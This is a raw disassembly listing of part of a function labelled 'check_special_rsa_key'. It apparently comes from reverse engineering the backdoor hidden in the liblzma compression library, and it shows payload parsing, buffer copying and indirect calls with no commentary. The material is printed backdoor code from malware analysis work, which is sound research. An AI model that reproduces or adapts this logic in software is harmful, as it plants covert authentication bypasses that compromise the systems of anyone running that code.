.text.lzma_index_stream_siza:0000000000009853                 mov     r12d, 87h
.text.lzma_index_stream_siza:0000000000009859                 xor     r14d, r14d
.text.lzma_index_stream_siza:000000000000985C                 mov     [rsp+5F8h+var_5E0], 5
.text.lzma_index_stream_siza:0000000000009865                 mov     eax, 4
.text.lzma_index_stream_siza:000000000000986A
.text.lzma_index_stream_siza:000000000000986A loc_986A:                               ; CODE XREF: check_special_rsa_key+33E↑j
.text.lzma_index_stream_siza:000000000000986A                                         ; check_special_rsa_key+37C↑j
.text.lzma_index_stream_siza:000000000000986A                 lea     rcx, [rsp+5F8h+var_550+4]
.text.lzma_index_stream_siza:0000000000009872                 lea     rsi, [rsp+5F8h+var_259]
.text.lzma_index_stream_siza:000000000000987A                 mov     [rsp+5F8h+var_5D0], rcx
.text.lzma_index_stream_siza:000000000000987F                 lea     ecx, [rax+1]
.text.lzma_index_stream_siza:0000000000009882                 mov     rdi, [rsp+5F8h+var_5D0]
.text.lzma_index_stream_siza:0000000000009887                 rep movsb
.text.lzma_index_stream_siza:0000000000009889                 xor     esi, esi
.text.lzma_index_stream_siza:000000000000988B                 mov     [rsp+5F8h+var_5A0], rsi
.text.lzma_index_stream_siza:0000000000009890                 mov     rdi, [rdx]
.text.lzma_index_stream_siza:0000000000009893                 mov     [rsp+5F8h+var_598], rsi
.text.lzma_index_stream_siza:0000000000009898                 test    rdi, rdi
.text.lzma_index_stream_siza:000000000000989B                 jz      loc_A142
.text.lzma_index_stream_siza:00000000000098A1                 mov     rax, [rdx+8]
.text.lzma_index_stream_siza:00000000000098A5                 test    rax, rax
.text.lzma_index_stream_siza:00000000000098A8                 jz      loc_A142
.text.lzma_index_stream_siza:00000000000098AE                 cmp     rdi, rax
.text.lzma_index_stream_siza:00000000000098B1                 jz      loc_A142
.text.lzma_index_stream_siza:00000000000098B7                 cmp     dword ptr [rdx+18h], 1
.text.lzma_index_stream_siza:00000000000098BB                 ja      loc_A142
.text.lzma_index_stream_siza:00000000000098C1                 mov     rdx, [r13+10h]
.text.lzma_index_stream_siza:00000000000098C5                 lea     rsi, [rsp+5F8h+var_5A0]
.text.lzma_index_stream_siza:00000000000098CA                 call    sub_74E0
.text.lzma_index_stream_siza:00000000000098CF                 test    eax, eax
.text.lzma_index_stream_siza:00000000000098D1                 jz      loc_A142
.text.lzma_index_stream_siza:00000000000098D7                 mov     rax, [r13+28h]
.text.lzma_index_stream_siza:00000000000098DB                 mov     rdx, [r13+10h]
.text.lzma_index_stream_siza:00000000000098DF                 lea     rsi, [rsp+5F8h+var_598]
.text.lzma_index_stream_siza:00000000000098E4                 mov     rdi, [rax+8]
.text.lzma_index_stream_siza:00000000000098E8                 call    sub_74E0
.text.lzma_index_stream_siza:00000000000098ED                 test    eax, eax
.text.lzma_index_stream_siza:00000000000098EF                 jz      loc_A142
.text.lzma_index_stream_siza:00000000000098F5                 mov     rdx, [rsp+5F8h+var_5A0]
.text.lzma_index_stream_siza:00000000000098FA                 cmp     rdx, [rsp+5F8h+var_598]
.text.lzma_index_stream_siza:00000000000098FF                 mov     [rsp+5F8h+var_5C0], rdx
.text.lzma_index_stream_siza:0000000000009904                 jnz     loc_A142
.text.lzma_index_stream_siza:000000000000990A                 lea     rax, [rsp+5F8h+var_590]
.text.lzma_index_stream_siza:000000000000990F                 mov     rsi, r13
.text.lzma_index_stream_siza:0000000000009912                 mov     rdi, rax
.text.lzma_index_stream_siza:0000000000009915                 mov     [rsp+5F8h+var_5C8], rax
.text.lzma_index_stream_siza:000000000000991A                 call    _Lparse_lzma12_0 ; PIC mode
.text.lzma_index_stream_siza:000000000000991F                 test    eax, eax
.text.lzma_index_stream_siza:0000000000009921                 jz      loc_A142
.text.lzma_index_stream_siza:0000000000009927                 mov     rdx, [rsp+5F8h+var_5C0]
.text.lzma_index_stream_siza:000000000000992C                 xor     r11d, r11d
.text.lzma_index_stream_siza:000000000000992F                 mov     dword ptr [rsp+5F8h+var_5C0], edx
.text.lzma_index_stream_siza:0000000000009933
.text.lzma_index_stream_siza:0000000000009933 loc_9933:                               ; CODE XREF: check_special_rsa_key+4BD↓j
.text.lzma_index_stream_siza:0000000000009933                 mov     eax, dword ptr [rsp+5F8h+var_5C0]
.text.lzma_index_stream_siza:0000000000009937                 mov     [rsp+5F8h+var_5B4], r11d
.text.lzma_index_stream_siza:000000000000993C                 cmp     r11d, eax
.text.lzma_index_stream_siza:000000000000993F                 jnb     loc_A142
.text.lzma_index_stream_siza:0000000000009945                 mov     rax, [rsp+5F8h+var_5E0]
.text.lzma_index_stream_siza:000000000000994A                 mov     [rsp+5F8h+var_5B0], r11
.text.lzma_index_stream_siza:000000000000994F                 mov     ecx, 25Ch
.text.lzma_index_stream_siza:0000000000009954                 lea     rsi, [rsp+5F8h+var_550]
.text.lzma_index_stream_siza:000000000000995C                 lea     rdx, [rax+4]
.text.lzma_index_stream_siza:0000000000009960                 mov     rax, [r13+28h]
.text.lzma_index_stream_siza:0000000000009964                 mov     rax, [rax+8]
.text.lzma_index_stream_siza:0000000000009968                 mov     rdi, [rax+r11*8]
.text.lzma_index_stream_siza:000000000000996C                 push    rax
.text.lzma_index_stream_siza:000000000000996D                 push    r13
.text.lzma_index_stream_siza:000000000000996F                 mov     r9, [rsp+608h+var_5C8]
.text.lzma_index_stream_siza:0000000000009974                 lea     r8, [rsp+608h+var_2CB]
.text.lzma_index_stream_siza:000000000000997C                 call    sub_7660
.text.lzma_index_stream_siza:0000000000009981                 mov     r11, [rsp+608h+var_5B0]
.text.lzma_index_stream_siza:0000000000009986                 pop     rdx
.text.lzma_index_stream_siza:0000000000009987                 pop     rcx
.text.lzma_index_stream_siza:0000000000009988                 inc     r11
.text.lzma_index_stream_siza:000000000000998B                 test    eax, eax
.text.lzma_index_stream_siza:000000000000998D                 jz      short loc_9933
.text.lzma_index_stream_siza:000000000000998F                 mov     eax, [rsp+5F8h+var_5B4]
.text.lzma_index_stream_siza:0000000000009993                 mov     [r13+100h], eax
.text.lzma_index_stream_siza:000000000000999A                 cmp     rbp, 2
.text.lzma_index_stream_siza:000000000000999E                 jnz     loc_9ABE
.text.lzma_index_stream_siza:00000000000099A4                 cmp     byte ptr [rsp+5F8h+var_2E0], 0
.text.lzma_index_stream_siza:00000000000099AC                 jns     loc_9ABE
.text.lzma_index_stream_siza:00000000000099B2                 test    r14, r14
.text.lzma_index_stream_siza:00000000000099B5                 jz      loc_A142
.text.lzma_index_stream_siza:00000000000099BB                 test    byte ptr [rsp+5F8h+var_2E0+1], 1
.text.lzma_index_stream_siza:00000000000099C3                 jz      short loc_99D6
.text.lzma_index_stream_siza:00000000000099C5                 cmp     [rsp+5F8h+var_5F8], 8
.text.lzma_index_stream_siza:00000000000099CA                 mov     eax, 8
.text.lzma_index_stream_siza:00000000000099CF                 ja      short loc_99D8
.text.lzma_index_stream_siza:00000000000099D1                 jmp     loc_A142
.text.lzma_index_stream_siza:00000000000099D6 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:00000000000099D6
.text.lzma_index_stream_siza:00000000000099D6 loc_99D6:                               ; CODE XREF: check_special_rsa_key+4F3↑j
.text.lzma_index_stream_siza:00000000000099D6                 xor     eax, eax
.text.lzma_index_stream_siza:00000000000099D8
.text.lzma_index_stream_siza:00000000000099D8 loc_99D8:                               ; CODE XREF: check_special_rsa_key+4FF↑j
.text.lzma_index_stream_siza:00000000000099D8                 lea     rdx, [rax+2]
.text.lzma_index_stream_siza:00000000000099DC                 cmp     [rsp+5F8h+var_5F8], rdx
.text.lzma_index_stream_siza:00000000000099E0                 jb      loc_A142
.text.lzma_index_stream_siza:00000000000099E6                 add     rax, 5C0h
.text.lzma_index_stream_siza:00000000000099EC                 add     rax, rsp
.text.lzma_index_stream_siza:00000000000099EF                 movzx   ebx, word ptr [r12+rax-2A3h]
.text.lzma_index_stream_siza:00000000000099F8                 mov     rax, [rsp+5F8h+var_5F8]
.text.lzma_index_stream_siza:00000000000099FC                 add     rbx, rdx
.text.lzma_index_stream_siza:00000000000099FF                 cmp     rbx, rax
.text.lzma_index_stream_siza:0000000000009A02                 jnb     loc_A142
.text.lzma_index_stream_siza:0000000000009A08                 sub     rax, rbx
.text.lzma_index_stream_siza:0000000000009A0B                 cmp     rax, 71h ; 'q'
.text.lzma_index_stream_siza:0000000000009A0F                 jbe     loc_A142
.text.lzma_index_stream_siza:0000000000009A15                 mov     rax, [r13+0E0h]
.text.lzma_index_stream_siza:0000000000009A1C                 mov     rdx, [r13+0E8h]
.text.lzma_index_stream_siza:0000000000009A23                 cmp     rax, rdx
.text.lzma_index_stream_siza:0000000000009A26                 jb      loc_A142
.text.lzma_index_stream_siza:0000000000009A2C                 sub     rax, rdx
.text.lzma_index_stream_siza:0000000000009A2F                 cmp     rax, 38h ; '8'
.text.lzma_index_stream_siza:0000000000009A33                 jbe     loc_A142
.text.lzma_index_stream_siza:0000000000009A39                 sub     rax, 39h ; '9'
.text.lzma_index_stream_siza:0000000000009A3D                 cmp     rax, rbx
.text.lzma_index_stream_siza:0000000000009A40                 jb      loc_A142
.text.lzma_index_stream_siza:0000000000009A46                 lea     rdi, [rsp+5F8h+var_2E0+5]
.text.lzma_index_stream_siza:0000000000009A4E                 mov     rdx, [r13+0F0h]
.text.lzma_index_stream_siza:0000000000009A55                 xor     eax, eax
.text.lzma_index_stream_siza:0000000000009A57                 lea     rsi, [rdi+r12]
.text.lzma_index_stream_siza:0000000000009A5B
.text.lzma_index_stream_siza:0000000000009A5B loc_9A5B:                               ; CODE XREF: check_special_rsa_key+597↓j
.text.lzma_index_stream_siza:0000000000009A5B                 mov     cl, [rsi+rax]
.text.lzma_index_stream_siza:0000000000009A5E                 mov     [rdx+rax], cl
.text.lzma_index_stream_siza:0000000000009A61                 inc     rax
.text.lzma_index_stream_siza:0000000000009A64                 cmp     rbx, rax
.text.lzma_index_stream_siza:0000000000009A67                 jnz     short loc_9A5B
.text.lzma_index_stream_siza:0000000000009A69                 mov     rax, [r13+28h]
.text.lzma_index_stream_siza:0000000000009A6D                 mov     rdx, [r13+0E8h]
.text.lzma_index_stream_siza:0000000000009A74                 lea     r8, [rbx+r12]
.text.lzma_index_stream_siza:0000000000009A78                 mov     r9d, [r13+100h]
.text.lzma_index_stream_siza:0000000000009A7F                 mov     rcx, [r13+0E0h]
.text.lzma_index_stream_siza:0000000000009A86                 add     r8, rdi
.text.lzma_index_stream_siza:0000000000009A89                 mov     rax, [rax+8]
.text.lzma_index_stream_siza:0000000000009A8D                 add     rdx, rbx
.text.lzma_index_stream_siza:0000000000009A90                 mov     rsi, [r13+0F0h]
.text.lzma_index_stream_siza:0000000000009A97                 mov     [r13+0E8h], rdx
.text.lzma_index_stream_siza:0000000000009A9E                 mov     rax, [rax+r9*8]
.text.lzma_index_stream_siza:0000000000009AA2                 push    r11
.text.lzma_index_stream_siza:0000000000009AA4                 mov     r9, r14
.text.lzma_index_stream_siza:0000000000009AA7                 push    r13
.text.lzma_index_stream_siza:0000000000009AA9                 mov     rdi, rax
.text.lzma_index_stream_siza:0000000000009AAC                 call    sub_7660
.text.lzma_index_stream_siza:0000000000009AB1                 pop     r14
.text.lzma_index_stream_siza:0000000000009AB3                 pop     r15
.text.lzma_index_stream_siza:0000000000009AB5                 test    eax, eax
.text.lzma_index_stream_siza:0000000000009AB7                 jnz     short loc_9AC7
.text.lzma_index_stream_siza:0000000000009AB9                 jmp     loc_A142
.text.lzma_index_stream_siza:0000000000009ABE ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009ABE
.text.lzma_index_stream_siza:0000000000009ABE loc_9ABE:                               ; CODE XREF: check_special_rsa_key+4CE↑j
.text.lzma_index_stream_siza:0000000000009ABE                                         ; check_special_rsa_key+4DC↑j
.text.lzma_index_stream_siza:0000000000009ABE                 test    r15, r15
.text.lzma_index_stream_siza:0000000000009AC1                 jnz     loc_A250
.text.lzma_index_stream_siza:0000000000009AC7
.text.lzma_index_stream_siza:0000000000009AC7 loc_9AC7:                               ; CODE XREF: check_special_rsa_key+5E7↑j
.text.lzma_index_stream_siza:0000000000009AC7                 cmp     [rsp+5F8h+var_5E8], r12
.text.lzma_index_stream_siza:0000000000009ACC                 jb      loc_A1EA
.text.lzma_index_stream_siza:0000000000009AD2
.text.lzma_index_stream_siza:0000000000009AD2 loc_9AD2:                               ; CODE XREF: check_special_rsa_key+D86↓j
.text.lzma_index_stream_siza:0000000000009AD2                 mov     rax, [rsp+5F8h+var_5E8]
.text.lzma_index_stream_siza:0000000000009AD7                 sub     rax, r12
.text.lzma_index_stream_siza:0000000000009ADA                 cmp     rax, rbx
.text.lzma_index_stream_siza:0000000000009ADD                 jb      loc_A1EA
.text.lzma_index_stream_siza:0000000000009AE3                 mov     al, byte ptr [rsp+5F8h+var_2E0]
.text.lzma_index_stream_siza:0000000000009AEA                 test    al, 4
.text.lzma_index_stream_siza:0000000000009AEC                 jz      short loc_9B14
.text.lzma_index_stream_siza:0000000000009AEE                 mov     rdx, [r13+10h]
.text.lzma_index_stream_siza:0000000000009AF2                 test    rdx, rdx
.text.lzma_index_stream_siza:0000000000009AF5                 jz      short loc_9B14
.text.lzma_index_stream_siza:0000000000009AF7                 mov     rdx, [rdx+58h]
.text.lzma_index_stream_siza:0000000000009AFB                 test    rdx, rdx
.text.lzma_index_stream_siza:0000000000009AFE                 jz      short loc_9B14
.text.lzma_index_stream_siza:0000000000009B00                 mov     edi, 80000000h
.text.lzma_index_stream_siza:0000000000009B05                 call    rdx
.text.lzma_index_stream_siza:0000000000009B07                 mov     rax, [r13+30h]
.text.lzma_index_stream_siza:0000000000009B0B                 mov     dword ptr [rax+8], 1
.text.lzma_index_stream_siza:0000000000009B12                 jmp     short loc_9B2A
.text.lzma_index_stream_siza:0000000000009B14 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009B14
.text.lzma_index_stream_siza:0000000000009B14 loc_9B14:                               ; CODE XREF: check_special_rsa_key+61C↑j
.text.lzma_index_stream_siza:0000000000009B14                                         ; check_special_rsa_key+625↑j ...
.text.lzma_index_stream_siza:0000000000009B14                 mov     rdx, [r13+30h]
.text.lzma_index_stream_siza:0000000000009B18                 xor     r10d, r10d
.text.lzma_index_stream_siza:0000000000009B1B                 and     eax, 5
.text.lzma_index_stream_siza:0000000000009B1E                 mov     [rdx+8], r10d
.text.lzma_index_stream_siza:0000000000009B22                 cmp     al, 5
.text.lzma_index_stream_siza:0000000000009B24                 jz      loc_A1EA
.text.lzma_index_stream_siza:0000000000009B2A
.text.lzma_index_stream_siza:0000000000009B2A loc_9B2A:                               ; CODE XREF: check_special_rsa_key+642↑j
.text.lzma_index_stream_siza:0000000000009B2A                 mov     rax, [r13+10h]
.text.lzma_index_stream_siza:0000000000009B2E                 call    qword ptr [rax+10h]
.text.lzma_index_stream_siza:0000000000009B31                 mov     r15b, byte ptr [rsp+5F8h+var_2E0]
.text.lzma_index_stream_siza:0000000000009B39                 mov     [r13+90h], eax
.text.lzma_index_stream_siza:0000000000009B40                 mov     r14d, eax
.text.lzma_index_stream_siza:0000000000009B43                 mov     r11d, r15d
.text.lzma_index_stream_siza:0000000000009B46                 and     r11b, 10h
.text.lzma_index_stream_siza:0000000000009B4A                 jz      short loc_9B5A
.text.lzma_index_stream_siza:0000000000009B4C                 mov     rax, [r13+30h]
.text.lzma_index_stream_siza:0000000000009B50                 cmp     dword ptr [rax+4], 0
.text.lzma_index_stream_siza:0000000000009B54                 jz      loc_A1EA
.text.lzma_index_stream_siza:0000000000009B5A
.text.lzma_index_stream_siza:0000000000009B5A loc_9B5A:                               ; CODE XREF: check_special_rsa_key+67A↑j
.text.lzma_index_stream_siza:0000000000009B5A                 test    r15b, 2
.text.lzma_index_stream_siza:0000000000009B5E                 jnz     short loc_9B67
.text.lzma_index_stream_siza:0000000000009B60
.text.lzma_index_stream_siza:0000000000009B60 loc_9B60:                               ; CODE XREF: check_special_rsa_key+6A9↓j
.text.lzma_index_stream_siza:0000000000009B60                                         ; check_special_rsa_key+6AE↓j
.text.lzma_index_stream_siza:0000000000009B60                 test    rbp, rbp
.text.lzma_index_stream_siza:0000000000009B63                 jz      short loc_9B85
.text.lzma_index_stream_siza:0000000000009B65                 jmp     short loc_9B92
.text.lzma_index_stream_siza:0000000000009B67 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009B67
.text.lzma_index_stream_siza:0000000000009B67 loc_9B67:                               ; CODE XREF: check_special_rsa_key+68E↑j
.text.lzma_index_stream_siza:0000000000009B67                 lea     rdi, [rsp+5F8h+var_2E0]
.text.lzma_index_stream_siza:0000000000009B6F                 mov     rsi, r13
.text.lzma_index_stream_siza:0000000000009B72                 call    _Llzma_rc_prices_1 ; PIC mode
.text.lzma_index_stream_siza:0000000000009B77                 test    eax, eax
.text.lzma_index_stream_siza:0000000000009B79                 jnz     short loc_9B60
.text.lzma_index_stream_siza:0000000000009B7B                 test    r11b, r11b
.text.lzma_index_stream_siza:0000000000009B7E                 jz      short loc_9B60
.text.lzma_index_stream_siza:0000000000009B80                 jmp     loc_A1EA
.text.lzma_index_stream_siza:0000000000009B85 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009B85
.text.lzma_index_stream_siza:0000000000009B85 loc_9B85:                               ; CODE XREF: check_special_rsa_key+693↑j
.text.lzma_index_stream_siza:0000000000009B85                 mov     cl, byte ptr [rsp+5F8h+var_2E0+1]
.text.lzma_index_stream_siza:0000000000009B8C                 test    cl, cl
.text.lzma_index_stream_siza:0000000000009B8E                 jns     short loc_9BF7
.text.lzma_index_stream_siza:0000000000009B90                 jmp     short loc_9C09
.text.lzma_index_stream_siza:0000000000009B92 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009B92
.text.lzma_index_stream_siza:0000000000009B92 loc_9B92:                               ; CODE XREF: check_special_rsa_key+695↑j
.text.lzma_index_stream_siza:0000000000009B92                 cmp     ebp, 1
.text.lzma_index_stream_siza:0000000000009B95                 jz      short loc_9BA3
.text.lzma_index_stream_siza:0000000000009B97                 cmp     ebp, 3
.text.lzma_index_stream_siza:0000000000009B9A                 jz      short loc_9BAF
.text.lzma_index_stream_siza:0000000000009B9C
.text.lzma_index_stream_siza:0000000000009B9C loc_9B9C:                               ; CODE XREF: check_special_rsa_key+6DD↓j
.text.lzma_index_stream_siza:0000000000009B9C                                         ; check_special_rsa_key+720↓j
.text.lzma_index_stream_siza:0000000000009B9C                 xor     eax, eax
.text.lzma_index_stream_siza:0000000000009B9E                 jmp     loc_9CBA
.text.lzma_index_stream_siza:0000000000009BA3 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009BA3
.text.lzma_index_stream_siza:0000000000009BA3 loc_9BA3:                               ; CODE XREF: check_special_rsa_key+6C5↑j
.text.lzma_index_stream_siza:0000000000009BA3                 test    byte ptr [rsp+5F8h+var_2E0+1], 1
.text.lzma_index_stream_siza:0000000000009BAB                 jz      short loc_9BE4
.text.lzma_index_stream_siza:0000000000009BAD                 jmp     short loc_9B9C
.text.lzma_index_stream_siza:0000000000009BAF ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009BAF
.text.lzma_index_stream_siza:0000000000009BAF loc_9BAF:                               ; CODE XREF: check_special_rsa_key+6CA↑j
.text.lzma_index_stream_siza:0000000000009BAF                 mov     dl, byte ptr [rsp+5F8h+var_2E0+3]
.text.lzma_index_stream_siza:0000000000009BB6                 test    dl, dl
.text.lzma_index_stream_siza:0000000000009BB8                 jns     short loc_9BD1
.text.lzma_index_stream_siza:0000000000009BBA
.text.lzma_index_stream_siza:0000000000009BBA loc_9BBA:                               ; CODE XREF: check_special_rsa_key+70D↓j
.text.lzma_index_stream_siza:0000000000009BBA                 mov     cl, byte ptr [rsp+5F8h+var_2E0+2]
.text.lzma_index_stream_siza:0000000000009BC1                 xor     eax, eax
.text.lzma_index_stream_siza:0000000000009BC3                 test    cl, 20h
.text.lzma_index_stream_siza:0000000000009BC6                 jnz     loc_9C5E
.text.lzma_index_stream_siza:0000000000009BCC                 jmp     loc_9CB7
.text.lzma_index_stream_siza:0000000000009BD1 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009BD1
.text.lzma_index_stream_siza:0000000000009BD1 loc_9BD1:                               ; CODE XREF: check_special_rsa_key+6E8↑j
.text.lzma_index_stream_siza:0000000000009BD1                 mov     rax, [r13+20h]
.text.lzma_index_stream_siza:0000000000009BD5                 cmp     qword ptr [rax+0C8h], 0
.text.lzma_index_stream_siza:0000000000009BDD                 jnz     short loc_9BBA
.text.lzma_index_stream_siza:0000000000009BDF                 jmp     loc_A1EA
.text.lzma_index_stream_siza:0000000000009BE4 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009BE4
.text.lzma_index_stream_siza:0000000000009BE4 loc_9BE4:                               ; CODE XREF: check_special_rsa_key+6DB↑j
.text.lzma_index_stream_siza:0000000000009BE4                 mov     rax, [r13+20h]
.text.lzma_index_stream_siza:0000000000009BE8                 cmp     qword ptr [rax+0C8h], 0
.text.lzma_index_stream_siza:0000000000009BF0                 jnz     short loc_9B9C
.text.lzma_index_stream_siza:0000000000009BF2                 jmp     loc_A1EA
.text.lzma_index_stream_siza:0000000000009BF7 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009BF7
.text.lzma_index_stream_siza:0000000000009BF7 loc_9BF7:                               ; CODE XREF: check_special_rsa_key+6BE↑j
.text.lzma_index_stream_siza:0000000000009BF7                 mov     rax, [r13+20h]
.text.lzma_index_stream_siza:0000000000009BFB                 cmp     qword ptr [rax+0C8h], 0
.text.lzma_index_stream_siza:0000000000009C03                 jz      loc_A1EA
.text.lzma_index_stream_siza:0000000000009C09
.text.lzma_index_stream_siza:0000000000009C09 loc_9C09:                               ; CODE XREF: check_special_rsa_key+6C0↑j
.text.lzma_index_stream_siza:0000000000009C09                 xor     eax, eax
.text.lzma_index_stream_siza:0000000000009C0B                 mov     dl, 0FFh
.text.lzma_index_stream_siza:0000000000009C0D                 test    cl, 2
.text.lzma_index_stream_siza:0000000000009C10                 jz      short loc_9C21
.text.lzma_index_stream_siza:0000000000009C12                 mov     dx, word ptr [rsp+5F8h+var_2E0+2]
.text.lzma_index_stream_siza:0000000000009C1A                 shr     dx, 6
.text.lzma_index_stream_siza:0000000000009C1E                 and     edx, 7Fh
.text.lzma_index_stream_siza:0000000000009C21
.text.lzma_index_stream_siza:0000000000009C21 loc_9C21:                               ; CODE XREF: check_special_rsa_key+740↑j
.text.lzma_index_stream_siza:0000000000009C21                 mov     al, dl
.text.lzma_index_stream_siza:0000000000009C23                 mov     dl, 0FFh
.text.lzma_index_stream_siza:0000000000009C25                 test    r15b, r15b
.text.lzma_index_stream_siza:0000000000009C28                 jns     short loc_9C39
.text.lzma_index_stream_siza:0000000000009C2A                 mov     rdx, [rsp+5F8h+var_2E0]
.text.lzma_index_stream_siza:0000000000009C32                 shr     rdx, 1Dh
.text.lzma_index_stream_siza:0000000000009C36                 and     edx, 1Fh
.text.lzma_index_stream_siza:0000000000009C39
.text.lzma_index_stream_siza:0000000000009C39 loc_9C39:                               ; CODE XREF: check_special_rsa_key+758↑j
.text.lzma_index_stream_siza:0000000000009C39                 and     cl, 4
.text.lzma_index_stream_siza:0000000000009C3C                 mov     ah, dl
.text.lzma_index_stream_siza:0000000000009C3E                 jz      short loc_9C86
.text.lzma_index_stream_siza:0000000000009C40                 mov     dl, byte ptr [rsp+5F8h+var_2E0+4]
.text.lzma_index_stream_siza:0000000000009C47                 and     eax, 0FF00FFFFh
.text.lzma_index_stream_siza:0000000000009C4C                 mov     ecx, edx
.text.lzma_index_stream_siza:0000000000009C4E                 shr     dl, 5
.text.lzma_index_stream_siza:0000000000009C51                 shr     cl, 2
.text.lzma_index_stream_siza:0000000000009C54                 and     ecx, 7
.text.lzma_index_stream_siza:0000000000009C57                 shl     ecx, 10h
.text.lzma_index_stream_siza:0000000000009C5A                 or      eax, ecx
.text.lzma_index_stream_siza:0000000000009C5C                 jmp     short loc_9CAB
.text.lzma_index_stream_siza:0000000000009C5E ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009C5E
.text.lzma_index_stream_siza:0000000000009C5E loc_9C5E:                               ; CODE XREF: check_special_rsa_key+6F6↑j
.text.lzma_index_stream_siza:0000000000009C5E                 mov     sil, 0FFh
.text.lzma_index_stream_siza:0000000000009C61                 test    cl, cl
.text.lzma_index_stream_siza:0000000000009C63                 jns     short loc_9C6D
.text.lzma_index_stream_siza:0000000000009C65                 mov     sil, byte ptr [rsp+5F8h+var_2E0+4]
.text.lzma_index_stream_siza:0000000000009C6D
.text.lzma_index_stream_siza:0000000000009C6D loc_9C6D:                               ; CODE XREF: check_special_rsa_key+793↑j
.text.lzma_index_stream_siza:0000000000009C6D                 and     cl, 40h
.text.lzma_index_stream_siza:0000000000009C70                 mov     al, sil
.text.lzma_index_stream_siza:0000000000009C73                 mov     sil, 0FFh
.text.lzma_index_stream_siza:0000000000009C76                 jz      short loc_9C7D
.text.lzma_index_stream_siza:0000000000009C78                 mov     esi, edx
.text.lzma_index_stream_siza:0000000000009C7A                 and     esi, 3Fh
.text.lzma_index_stream_siza:0000000000009C7D
.text.lzma_index_stream_siza:0000000000009C7D loc_9C7D:                               ; CODE XREF: check_special_rsa_key+7A6↑j
.text.lzma_index_stream_siza:0000000000009C7D                 mov     ecx, esi
.text.lzma_index_stream_siza:0000000000009C7F                 and     dl, 40h
.text.lzma_index_stream_siza:0000000000009C82                 mov     ah, cl
.text.lzma_index_stream_siza:0000000000009C84                 jnz     short loc_9C8F
.text.lzma_index_stream_siza:0000000000009C86
.text.lzma_index_stream_siza:0000000000009C86 loc_9C86:                               ; CODE XREF: check_special_rsa_key+76E↑j
.text.lzma_index_stream_siza:0000000000009C86                 or      eax, 0FF0000h
.text.lzma_index_stream_siza:0000000000009C8B                 mov     dl, 0FFh
.text.lzma_index_stream_siza:0000000000009C8D                 jmp     short loc_9CAB
.text.lzma_index_stream_siza:0000000000009C8F ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009C8F
.text.lzma_index_stream_siza:0000000000009C8F loc_9C8F:                               ; CODE XREF: check_special_rsa_key+7B4↑j
.text.lzma_index_stream_siza:0000000000009C8F                 mov     dl, byte ptr [rsp+5F8h+var_2E0+1]
.text.lzma_index_stream_siza:0000000000009C96                 and     eax, 0FF00FFFFh
.text.lzma_index_stream_siza:0000000000009C9B                 mov     ecx, edx
.text.lzma_index_stream_siza:0000000000009C9D                 shr     dl, 3
.text.lzma_index_stream_siza:0000000000009CA0                 and     ecx, 7
.text.lzma_index_stream_siza:0000000000009CA3                 and     edx, 7
.text.lzma_index_stream_siza:0000000000009CA6                 shl     ecx, 10h
.text.lzma_index_stream_siza:0000000000009CA9                 or      eax, ecx
.text.lzma_index_stream_siza:0000000000009CAB
.text.lzma_index_stream_siza:0000000000009CAB loc_9CAB:                               ; CODE XREF: check_special_rsa_key+78C↑j
.text.lzma_index_stream_siza:0000000000009CAB                                         ; check_special_rsa_key+7BD↑j
.text.lzma_index_stream_siza:0000000000009CAB                 shl     edx, 18h
.text.lzma_index_stream_siza:0000000000009CAE                 and     eax, 0FFFFFFh
.text.lzma_index_stream_siza:0000000000009CB3                 or      eax, edx
.text.lzma_index_stream_siza:0000000000009CB5                 jmp     short loc_9CBA
.text.lzma_index_stream_siza:0000000000009CB7 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009CB7
.text.lzma_index_stream_siza:0000000000009CB7 loc_9CB7:                               ; CODE XREF: check_special_rsa_key+6FC↑j
.text.lzma_index_stream_siza:0000000000009CB7                 or      eax, 0FFFFFFFFh
.text.lzma_index_stream_siza:0000000000009CBA
.text.lzma_index_stream_siza:0000000000009CBA loc_9CBA:                               ; CODE XREF: check_special_rsa_key+6CE↑j
.text.lzma_index_stream_siza:0000000000009CBA                                         ; check_special_rsa_key+7E5↑j
.text.lzma_index_stream_siza:0000000000009CBA                 mov     [r13+54h], eax
.text.lzma_index_stream_siza:0000000000009CBE                 lea     r8, [rsp+r12+5F8h+var_2E0+5]
.text.lzma_index_stream_siza:0000000000009CC6                 test    r14d, r14d
.text.lzma_index_stream_siza:0000000000009CC9                 jnz     loc_A15C
.text.lzma_index_stream_siza:0000000000009CCF                 mov     r12, [r13+10h]
.text.lzma_index_stream_siza:0000000000009CD3                 test    r12, r12
.text.lzma_index_stream_siza:0000000000009CD6                 jz      loc_A1EA
.text.lzma_index_stream_siza:0000000000009CDC                 mov     rcx, [r12+20h]
.text.lzma_index_stream_siza:0000000000009CE1                 test    rcx, rcx
.text.lzma_index_stream_siza:0000000000009CE4                 jz      loc_A1EA
.text.lzma_index_stream_siza:0000000000009CEA                 cmp     qword ptr [r12+28h], 0
.text.lzma_index_stream_siza:0000000000009CF0                 jz      loc_A1EA
.text.lzma_index_stream_siza:0000000000009CF6                 cmp     qword ptr [r12+30h], 0
.text.lzma_index_stream_siza:0000000000009CFC                 jz      loc_A1EA
.text.lzma_index_stream_siza:0000000000009D02                 test    rbp, rbp
.text.lzma_index_stream_siza:0000000000009D05                 jnz     loc_9F47
.text.lzma_index_stream_siza:0000000000009D0B                 mov     rax, [r13+20h]
.text.lzma_index_stream_siza:0000000000009D0F                 test    rax, rax
.text.lzma_index_stream_siza:0000000000009D12                 jz      loc_A1EA
.text.lzma_index_stream_siza:0000000000009D18                 cmp     qword ptr [rax+58h], 0
.text.lzma_index_stream_siza:0000000000009D1D                 jz      loc_A1EA
.text.lzma_index_stream_siza:0000000000009D23                 cmp     dword ptr [rax], 0
.text.lzma_index_stream_siza:0000000000009D26                 jz      loc_A1EA
